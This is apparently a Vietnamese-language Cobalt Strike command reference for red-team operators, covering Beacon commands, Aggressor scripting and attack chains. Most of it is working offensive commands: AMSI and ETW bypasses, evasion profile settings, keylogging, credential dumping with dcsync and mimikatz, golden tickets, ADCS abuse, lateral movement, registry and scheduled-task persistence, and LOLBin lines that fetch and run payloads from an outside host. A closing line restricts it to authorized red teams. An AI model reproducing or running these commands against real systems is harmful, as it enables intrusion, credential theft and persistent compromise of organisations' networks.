Giả mạo tham số dòng lệnh hiển thị trong PEB/danh sách tiến trình cho tiến trình được tạo.

```
argue <binary> <tham_số_giả>

beacon> argue C:\Windows\System32\notepad.exe "C:\Users\jsmith\ghichu.txt"
```

### `obfuscate`

Bật/tắt obfuscation chuỗi trong bộ nhớ heap của Beacon (CS 4.2+).

```
beacon> obfuscate true
beacon> obfuscate false
```

### Vô Hiệu Hóa AMSI (qua inline BOF hoặc Powerpick)

Patch AMSI trong tiến trình hiện tại (cho phép PowerShell chưa ký / .NET được AMSI quét).

```
# Qua BOF:
beacon> inline-execute /opt/bofs/amsi_disable.o

# Qua reflection:
beacon> powerpick [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Vô Hiệu Hóa ETW (qua BOF)

Tắt ETW Threat Intelligence provider để giảm telemetry.

```
beacon> inline-execute /opt/bofs/etw_disable.o
```

### Malleable C2 Profile — Tránh Phát Hiện

Các thiết lập profile chính ảnh hưởng đến khả năng bị phát hiện:

```
stage {
    set userwx "false";           # Không dùng bộ nhớ RWX cho payload
    set cleanup "true";           # Xóa shellcode sau khi tải
    set sleep_mask "true";        # XOR-mask Beacon trong bộ nhớ khi ngủ
    set stomppe "true";            # Stomp PE header
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}
```

---

## 15. Beacon — Thao Tác Token

### `steal_token`

(Xem §10 — giả mạo token của tiến trình khác.)

### `make_token`

Tạo token với thông tin xác thực cụ thể (loại logon: Network — không có tiến trình mới).

```
make_token <domain\user> <mật_khẩu>

beacon> make_token CORP\administrator MatKhau123
[*] Đang giả mạo CORP\administrator
```

Sau `make_token`: các thao tác SMB/RPC dùng token mới. `inject` vẫn dùng ngữ cảnh gốc trừ khi bạn `steal_token` tiến trình mới.

### `rev2self`

Quay lại token gốc của Beacon.

```
beacon> rev2self
```

### `getuid`

Xem ngữ cảnh người dùng hiện tại.

```
beacon> getuid
```

### Ví Dụ Chuỗi Token

```
beacon> steal_token 4812          # lấy token Domain Admin từ explorer
beacon> getuid                    # xác nhận: CORP\jsmith (DA)
beacon> jump psexec dc01 lab-https
beacon> rev2self                  # bỏ token DA
```

---

## 16. Beacon — Giao Diện & Keylogging

### `screenshot`

Chụp màn hình của phiên desktop hiện tại.

```
screenshot

beacon> screenshot
# Ảnh chụp màn hình được lưu tại View → Screenshots
```

### `screenwatch`

Chụp màn hình liên tục theo khoảng thời gian.

```
screenwatch <khoảng_thời_gian_ms>

beacon> screenwatch 1000       # chụp màn hình mỗi 1 giây
```

### `keylogger`

Bắt đầu keylogger trong tiến trình hiện tại hoặc tiến trình mục tiêu.

```
keylogger [pid] [arch]

beacon> keylogger              # keylog trong tiến trình Beacon
beacon> keylogger 5120 x64    # keylog trong PID 5120 (vd: notepad, trình duyệt)
```

Kết quả xem tại: `View → Keystrokes`

### `keylogger stop`

Dừng keylogger.

```
beacon> keylogger stop
```

### `clipboard`

Thu thập nội dung clipboard hiện tại.

```
beacon> clipboard
```

### `desktop` (VNC)

Bắt đầu phiên VNC tương tác đến desktop mục tiêu.

```
desktop [pid] [arch] [chất_lượng]

beacon> desktop            # VNC trong tiến trình Beacon
beacon> desktop 5120 x64 50   # VNC trong tiến trình mục tiêu, chất lượng 50%
```

> Mở trình xem VNC trên client của operator. Yêu cầu component VNC JAVA.

---

## 17. Beacon — Lệnh Khác

### `reg`

Truy vấn hoặc sửa đổi Windows registry.

```
reg query    <hive\key>
reg query    <hive\key> <value>
reg set      <hive\key> <value> <type> <data>
reg delete   <hive\key>

beacon> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
beacon> reg set HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater REG_SZ "C:\Temp\beacon.exe"
```

### `runas`

Chạy lệnh với tư cách người dùng khác (yêu cầu mật khẩu plaintext).

```
runas <domain\user> <mật_khẩu> <lệnh>

beacon> runas CORP\administrator MatKhau123 cmd.exe /c whoami
```

### `spawnas`

(Xem §8 — tạo Beacon với tên người dùng khác.)

### `timestomp`

(Xem §7 — sao chép timestamp file.)

### `wdigest`

Bật caching thông tin xác thực WDigest cho các lần đăng nhập tiếp theo.

```
# Bật (yêu cầu admin):
beacon> shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Chờ người dùng đăng nhập / lock/unlock màn hình
beacon> logonpasswords   # bây giờ hiển thị plaintext
```

### `browserpivot`

Chiếm đoạt phiên Internet Explorer hoặc Chrome để duyệt web dưới tư cách người dùng đang đăng nhập.

```
browserpivot <pid> <arch>

beacon> browserpivot 5120 x64
# Mở proxy trên port team server — duyệt qua phiên IE của nạn nhân
```

---

## 18. Tham Khảo Aggressor Script

Aggressor Script là ngôn ngữ script của Cobalt Strike (dựa trên Sleep). Script tự động hóa nhiệm vụ, thêm lệnh tùy chỉnh, tạo menu UI, phản hồi sự kiện, và mở rộng chức năng Beacon.

### Tải Script

```
Cobalt Strike → Script Manager → Load → chọn file .cna
```

Hoặc từ dòng lệnh:
```
./agscript <host> <port> <user> <mật_khẩu> [/đường/dẫn/script.cna]
```

### Cấu Trúc File Script (`.cna`)

```coffeescript
# Chú thích bắt đầu bằng #

# Định nghĩa alias tùy chỉnh (lệnh dùng được trong cửa sổ tương tác Beacon)
alias lenhcuatoi {
    local('$bid $arg1');
    $bid   = $1;         # Beacon ID (luôn là tham số đầu tiên)
    $arg1  = $2;
    btask($bid, "Đang chạy lệnh tùy chỉnh với tham số: $arg1");
    bshell($bid, "whoami");
}

# Đăng ký event handler
on beacon_initial {
    local('$bid');
    $bid = $1;
    btask($bid, "Beacon mới đã check in!");
}
```

### Hàm Aggressor Quan Trọng

#### Hàm Giao Nhiệm Vụ Beacon (`b*`)

```coffeescript
bshell($bid, "whoami");                        # lệnh shell
bpowershell($bid, "Get-Process");              # powershell
bpowerpick($bid, "Get-Process");              # powerpick
brun($bid, "whoami");                          # run
bexecute_assembly($bid, "Rubeus.exe", "triage");  # execute-assembly
bsleep($bid, 30, 10);                          # sleep 30 jitter 10%
bls($bid, "C:\\");                             # ls
bcd($bid, "C:\\Temp");                         # cd
bpwd($bid);                                    # pwd
bmkdir($bid, "C:\\Temp\\exfil");              # mkdir
brm($bid, "C:\\Temp\\file.txt");              # rm
bdownload($bid, "C:\\Temp\\file.txt");         # download
bupload($bid, "C:\\Temp\\file.txt", "C:\\Temp\\file.txt");  # upload
bps($bid);                                     # ps
bkill($bid, 1234);                             # kill
bgetuid($bid);                                 # getuid
bgetsystem($bid);                              # getsystem
bhashdump($bid);                               # hashdump
blogonpasswords($bid);                         # logonpasswords
bdcsync($bid, "corp.local", "administrator");  # dcsync
bpth($bid, "CORP\\admin", "hash");             # pth
binject($bid, 5120, "x64", "lab-https");       # inject
bspawnas($bid, "CORP\\admin", "pass", "lab-https");  # spawnas
bjump($bid, "psexec", "dc01", "lab-https");    # jump
bshinject($bid, 5120, "x64", "/path/to/sc.bin");  # shinject
bscreenshot($bid);                             # screenshot
bkeylogger($bid);                              # keylogger
btimestomp($bid, "nguon.exe", "dich.exe");     # timestomp
breg_query($bid, "HKLM\\SOFTWARE\\...");       # reg query
bportscan($bid, "10.0.0.0/24", "22,80,445", "arp", 1024);  # portscan
bsocks($bid, 1080);                            # socks
bmake_token($bid, "CORP\\admin", "pass");      # make_token
bsteal_token($bid, 4812);                      # steal_token
brev2self($bid);                               # rev2self
```

#### Đọc Output

```coffeescript
# Đăng ký callback cho output từ lệnh
sub ham_xu_ly_output {
    local('$bid $ket_qua');
    $bid      = $1;
    $ket_qua  = $2;
    println("Beacon $bid trả về: $ket_qua");
}

bshell($bid, "whoami", &ham_xu_ly_output);
```

#### Dialog (Hộp Thoại)

```coffeescript
dialog "Dialog Tùy Chỉnh", %(truong1 => "mac_dinh"), {
    local('$bid $vals');
    $bid  = [$1 get: 0];
    $vals = $3;
    bshell($bid, "echo " . $vals['truong1']);
};
drow_text($dialog, "truong1", "Nhập giá trị:");
dbutton_action($dialog, "Chạy");
dialog_show($dialog);
```

#### Event Handler

```coffeescript
on beacon_initial     { /* beacon mới */ }
on beacon_checkin     { /* check-in định kỳ */ }
on beacon_output      { /* output lệnh */ }
on beacon_error       { /* lỗi */ }
on beacon_input       { /* operator gõ lệnh */ }
on event_join         { /* operator tham gia */ }
on event_quit         { /* operator ngắt kết nối */ }
on event_newsite      { /* site mới được tạo */ }
on heartbeat_5s       { /* mỗi 5 giây */ }
on heartbeat_1m       { /* mỗi phút */ }
```

#### Mở Rộng Menu Chuột Phải

```coffeescript
popup beacon_top {
    item "Hành Động Tùy Chỉnh" {
        local('$bid');
        foreach $bid ($1) {
            bshell($bid, "hostname");
        }
    }
}

popup targets {
    item "Quét Máy Này" {
        local('$muc_tieu');
        $muc_tieu = $1;
        # ... thực hiện gì đó
    }
}
```

#### Hàm Tiện Ích

```coffeescript
beacon_info($bid, "os")            # lấy metadata Beacon: os, user, pid...
beacon_host($bid)                  # hostname mục tiêu
beacon_pid($bid)                   # PID Beacon
beacon_user($bid)                  # người dùng hiện tại
beacon_isadmin($bid)               # là admin không?
listener_names()                   # danh sách listener
strlen($str)                       # độ dài chuỗi
split(" ", $str)                   # tách chuỗi
join(", ", @mang)                  # nối mảng
uc($str)                           # chữ hoa
lc($str)                           # chữ thường
matches($str, $regex)              # regex match
gunzip($data)                      # giải nén
```

### Script Cộng Đồng Phổ Biến

| Script | Mục đích |
|---|---|
| `CobaltStrike-BOF` | Bộ sưu tập BOF |
| `Arsenal Kit` | Tạo Artifact + Payload |
| `Elevate Kit` | Thêm UAC bypass |
| `UDRL` | Reflective loader tùy chỉnh |
| `Situational Awareness BOF` | Khảo sát môi trường (không dùng cmd/ps) |
| `nanodump` | Dump LSASS bằng BOF |
| `EDRSandblast` | Bypass EDR qua UEFI/FltMgr |

---

## 19. Báo Cáo & Xuất Dữ Liệu

### Báo Cáo Tích Hợp Sẵn

```
Reporting menu → Activity Report         (Báo cáo hoạt động)
                  Hosts Report           (Báo cáo máy chủ)
                  Indicators of Compromise (IOC)
                  Sessions Report        (Báo cáo phiên)
                  Social Engineering Report (Báo cáo social engineering)
                  Tactics, Techniques & Procedures (TTP)
```

### Xuất Dữ Liệu

```
View → Credentials     → xuất dưới dạng .csv
View → Downloads       → đồng bộ về máy local
View → Keystrokes      → sao chép/xuất
View → Screenshots     → lưu vào thư mục
View → Targets         → xuất dưới dạng .csv
```

### Event Log (Nhật Ký Sự Kiện)

```
View → Event Log    # tất cả hành động operator và sự kiện Beacon
```

---

## 20. Kỹ Thuật Nâng Cao & Chuỗi Tấn Công

### Ví Dụ Chuỗi Tấn Công Toàn Miền

```
# Bước 1: Truy cập ban đầu qua phishing
# Nạn nhân chạy payload → Beacon check-in

# Bước 2: Khảo sát tình huống
beacon> sleep 0                              # tương tác để trinh sát
beacon> getuid                               # xác nhận người dùng
beacon> ps                                  # tìm tiến trình tốt để inject
beacon> net dclist                          # tìm DC
beacon> net group "Domain Admins"           # ai là DA?

# Bước 3: Leo thang đặc quyền
beacon> getsystem                            # thử SYSTEM
beacon> elevate uac-token-duplication lab-https  # lấy beacon admin

# Bước 4: Dump thông tin xác thực
beacon> hashdump                             # SAM local
beacon> logonpasswords                       # LSASS
beacon> dcsync corp.local CORP\krbtgt       # vật liệu golden ticket

# Bước 5: Di chuyển ngang
beacon> make_token CORP\administrator <mật_khẩu>
beacon> jump psexec dc01.corp.local lab-https

# Bước 6: Trên DC
beacon> dcsync corp.local CORP\administrator
beacon> hashdump

# Bước 7: Duy trì quyền truy cập
beacon> shell reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /t REG_SZ /d "C:\Temp\b.exe"
beacon> shell schtasks /create /tn "WindowsUpdate" /tr C:\Temp\b.exe /sc onlogon /ru SYSTEM
```

### Chuỗi Tấn Công Kerberos

```
# Kerberoast
beacon> execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt
# (Crack offline với hashcat -m 13100)

# AS-REP Roast
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat

# Pass-the-Ticket
beacon> execute-assembly Rubeus.exe dump /service:krbtgt /nowrap
beacon> execute-assembly Rubeus.exe ptt /ticket:<base64>

# Golden Ticket (sau dcsync để lấy hash krbtgt)
beacon> mimikatz kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Silver Ticket
beacon> mimikatz kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:<machine_hash> /ptt
```

### Lạm Dụng ADCS (Active Directory Certificate Services)

```
# Tìm certificate template dễ bị tổn thương
beacon> execute-assembly Certify.exe find /vulnerable

# Yêu cầu certificate cho domain admin
beacon> execute-assembly Certify.exe request /ca:ca01.corp.local\corp-CA /template:VulnTemplate /altname:administrator

# Chuyển đổi sang PFX (trên máy operator)
# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Upload PFX và xác thực
beacon> upload cert.pfx
beacon> execute-assembly Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:matkhau123 /ptt
```

### Relay Thông Tin Xác Thực (SMB NTLM)

```
# Bắt NTLM challenge (Responder chạy trên team server qua rportfwd)
beacon> rportfwd 445 192.168.1.100 445   # forward SMB trên mục tiêu về Responder của chúng ta
# Ép xác thực:
beacon> shell net use \\127.0.0.1\share  # hoặc coerce qua printerbug/petitpotam
```

### Living Off the Land (LOLBins)

```
# Tải xuống bằng certutil
beacon> shell certutil.exe -urlcache -split -f http://192.168.1.100/b.exe C:\Temp\b.exe

# Tải xuống bằng bitsadmin
beacon> shell bitsadmin /transfer myJob http://192.168.1.100/b.exe C:\Temp\b.exe

# Thực thi bằng mshta
beacon> shell mshta.exe http://192.168.1.100/payload.hta

# COM scriptlet qua regsvr32
beacon> shell regsvr32.exe /s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll

# wscript
beacon> shell wscript.exe //e:jscript C:\Temp\payload.js

# rundll32 qua javascript
beacon> shell rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(...)");
```

---

## 21. Bảng Tham Khảo Nhanh

### Trinh Sát

```
getuid | getpid | ps | net dclist | net computers | net group "Domain Admins"
shell systeminfo | shell ipconfig /all | shell netstat -ano | shell whoami /all
portscan 10.0.0.0/24 common arp 1024
```

### Thao Tác File

```
ls | cd | pwd | mkdir | mv | cp | rm | download | upload | drives | timestomp
```

### Thông Tin Xác Thực

```
hashdump | logonpasswords | dcsync <domain> <user>
mimikatz sekurlsa::logonpasswords
pth <domain\user> <hash>
execute-assembly Rubeus.exe kerberoast
execute-assembly Rubeus.exe asreproast
```

### Leo Thang Đặc Quyền

```
getsystem
elevate uac-token-duplication <listener>
elevate uac-schtasks <listener>
elevate juicy-potato <listener>    (Elevate Kit)
elevate printspoofer <listener>    (Elevate Kit)
elevate sweetpotato <listener>     (Elevate Kit)
```

### Di Chuyển Ngang

```
make_token <domain\user> <mật_khẩu>
steal_token <pid>
jump psexec <máy_chủ> <listener>
jump psexec64 <máy_chủ> <listener>
jump psexec_psh <máy_chủ> <listener>
jump winrm64 <máy_chủ> <listener>
jump wmi <máy_chủ> <listener>
remote-exec psexec <máy_chủ> <lệnh>
```

### Injection / Thực Thi

```
inject <pid> <arch> <listener>
shinject <pid> <arch> <shellcode.bin>
dllinject <pid> <dll>
execute-assembly <asm.exe> [tham_số]
powerpick <biểu_thức>
inline-execute <bof.o> [tham_số]
```

### OPSEC

```
sleep 60 30                          # 60 giây, jitter 30%
spawnto x64 C:\Windows\System32\dllhost.exe
ppid 4812                            # giả mạo parent PID
blockdlls start                      # chặn inject DLL bên thứ ba
argue <binary> <tham_số_giả>
```

### Pivoting

```
socks 1080
rportfwd <bind_port> <dst_host> <dst_port>
link <máy_chủ> [tên_pipe]
connect <máy_chủ> <port>
```

### Keylogging / Màn Hình

```
screenshot | screenwatch 1000 | keylogger | keylogger stop | clipboard | desktop
```

---

---

## 22. Lệnh Còn Thiếu & Ít Được Biết Đến

### `execute`

Thực thi chương trình trên mục tiêu **không bắt output** (fire-and-forget — nhanh hơn `run`).

```
execute <chương_trình> [tham_số]

beacon> execute C:\Temp\payload.exe
beacon> execute cmd.exe /c start calc.exe
```

> Dùng khi không cần output và muốn footprint tối thiểu. Không có fork&run — chạy trực tiếp.

### `downloads`

Liệt kê tất cả file download đang tiến hành từ Beacon này.

```
beacon> downloads
 Tên                    Kích thước   Tiến độ
 ---                    ----------   -------
 C:\Windows\ntds.dit    50,331,648   12%
```

### `cancel`

Hủy file download đang tiến hành.

```
cancel <tên_file_hoặc_*>

beacon> cancel ntds.dit
beacon> cancel *           # hủy tất cả download từ Beacon này
```

### `jobs`

Liệt kê các nhiệm vụ post-exploitation chạy lâu dài (keylogger, screenwatch, browserpivot, v.v.).

```
beacon> jobs
 JID  PID   Mô tả
 ---  ---   -----
   1  5120  keylogger
   2     0  screenwatch
```

### `jobkill`

Kết thúc một post-exploitation job đang chạy theo JID.

```
jobkill <jid>

beacon> jobkill 1
```

### `powershell-import`

Import script PowerShell vào bộ nhớ của Beacon để các hàm của nó khả dụng cho các lần gọi `powershell` và `powerpick` tiếp theo.

```
powershell-import <đường_dẫn_script_local>

beacon> powershell-import /opt/tools/PowerView.ps1
beacon> powerpick Get-DomainUser -SPN    # hàm PowerView bây giờ khả dụng
```

> Script đã import tồn tại trong suốt thời gian của phiên Beacon (cho đến khi `powershell-import` được gọi lại với script mới, hoặc Beacon thoát).

### `mode` (chỉ DNS Beacon)

Chuyển đổi giao thức data channel của DNS Beacon.

```
mode dns        # Dùng DNS A records (mặc định)
mode dns-txt    # Dùng DNS TXT records (nhiều data hơn mỗi query, nhưng ồn hơn)
mode dns6       # Dùng DNS AAAA records (định dạng IPv6, ẩn hơn)
mode http       # Chuyển sang HTTP (nếu listener cũng có HTTP fallback)

beacon> mode dns-txt
beacon> mode dns6
```

> DNS-TXT cung cấp throughput cao hơn (~250 byte mỗi record so với ~15 cho A). Dùng khi exfiltrate file lớn qua DNS.

### `runu`

Thực thi chương trình trong ngữ cảnh của tiến trình khác (chạy trong token context của tiến trình khác).

```
runu <pid> <chương_trình> [tham_số]

beacon> runu 4812 cmd.exe /c whoami
beacon> runu 1234 C:\Temp\payload.exe
```

### `psexec` (standalone)

Dùng service execution kiểu PsExec để chạy lệnh trên máy từ xa.

```
psexec <mục_tiêu> <share> <tên_service> <mô_tả_service> <arch> <listener>

beacon> psexec dc01.corp.local ADMIN$ "SvcUpdate" "Windows Update Service" x64 lab-https
```

---

## 23. Metadata Beacon & Quản Lý Beacon

### Xem Tất Cả Beacon

```
View → Sessions     # bảng tất cả Beacon đang hoạt động với metadata
```

Các cột: ID, callback cuối, sleep, máy chủ, người dùng, tiến trình, PID, arch, listener, ghi chú.

### Menu Context của Beacon (Chuột Phải)

```
Interact          → mở cửa sổ tương tác Beacon
Access            → sub-menu: dump hash, leo thang, bypass UAC, pth, chạy mimikatz
Explore           → sub-menu: browser pivot, desktop, file browser, xem net, quét port, danh sách tiến trình, chụp màn hình
Pivoting          → sub-menu: SOCKS, listener, rportfwd
Spawn             → tạo trong listener mới
Session           → sub-menu: ghi chú, màu sắc, xóa
```

### Tô Màu Beacon

Hữu ích để tổ chức trực quan (vd: đỏ = DA, xanh = user thông thường):

```
Chuột phải → Session → Color
```

### Xóa Beacon Đã Chết

```
Chuột phải → Session → Remove
```

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
